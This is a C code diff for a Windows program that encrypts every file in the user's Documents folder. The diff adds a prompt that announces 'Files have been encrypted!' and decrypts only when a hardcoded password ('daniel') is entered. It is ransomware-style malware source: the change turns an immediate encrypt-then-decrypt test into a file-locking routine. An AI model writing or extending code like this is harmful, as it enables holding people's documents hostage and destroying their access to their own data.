@@ -213,15 +213,35 @@ void decryptFiles(const char* folderPath) {
   FindClose(hFind);
 }
 
+// Add this function near the top with other functions
+int verifyPassword() {
+    char password[50];
+    printf("Files have been encrypted!\n");
+    printf("Enter password to decrypt: ");
+    scanf("%s", password);
+    
+    // Hardcoded password comparison
+    return strcmp(password, "daniel") == 0;
+}
 
+// Replace the main function
 int main() {
     char documentsPath[MAX_PATH];
     HRESULT result = SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, documentsPath);
     
     if (SUCCEEDED(result)) {
         printf("Documents folder: %s\n", documentsPath);
+        // First encrypt everything
         handleFiles(documentsPath);
-        decryptFiles(documentsPath);
+        
+        // Only decrypt if correct password is provided
+        if (verifyPassword()) {
+            printf("Password correct! Decrypting files...\n");
+            decryptFiles(documentsPath);
+            printf("Decryption complete!\n");
+        } else {
+            printf("Incorrect password! Files will remain encrypted.\n");
+        }
     } else {
         printf("Error getting Documents folder path. Error code: %ld\n", result);
         return 1;
